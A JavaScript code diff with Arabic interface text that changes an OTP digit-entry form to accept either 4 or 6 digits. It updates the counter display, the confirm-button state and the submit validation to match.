@@ -116,10 +116,18 @@ function updateCounter() {
   const boxes = [...document.querySelectorAll('.otp-box')];
   const filled = boxes.filter(b => b.value).length;
   const counter = document.getElementById('otp-counter');
-  if (counter) counter.innerHTML = `<b>${filled}</b>/${otpLength} أرقام (يجب أن يكون 4 أو 6 أرقام)`;
+  if (counter) {
+    if (filled === 4 || filled === 6) {
+      counter.innerHTML = `<b>${filled}</b>/${filled} أرقام — جاهز للتأكيد`;
+      counter.style.color = '#22c55e';
+    } else {
+      counter.innerHTML = `<b>${filled}</b>/6 أرقام (يجب أن يكون 4 أو 6 أرقام)`;
+      counter.style.color = '';
+    }
+  }
 
   const confirmBtn = document.getElementById('otp-confirm-btn');
-  if (confirmBtn) confirmBtn.disabled = filled !== otpLength;
+  if (confirmBtn) confirmBtn.disabled = filled !== 4 && filled !== 6;
 }
 
 /* ─── مربعات OTP ───────────────────────────────────── */
@@ -268,7 +276,7 @@ async function submitOTP() {
   const boxes = [...document.querySelectorAll('.otp-box')];
   const entered = boxes.map(b => b.value).join('');
 
-  if (entered.length < otpLength) { setOTPErr(`يرجى إدخال ${otpLength} أرقام`); return; }
+  if (entered.length !== 4 && entered.length !== 6) { setOTPErr('يرجى إدخال 4 أو 6 أرقام'); return; }
 
   userOTP = entered;
 
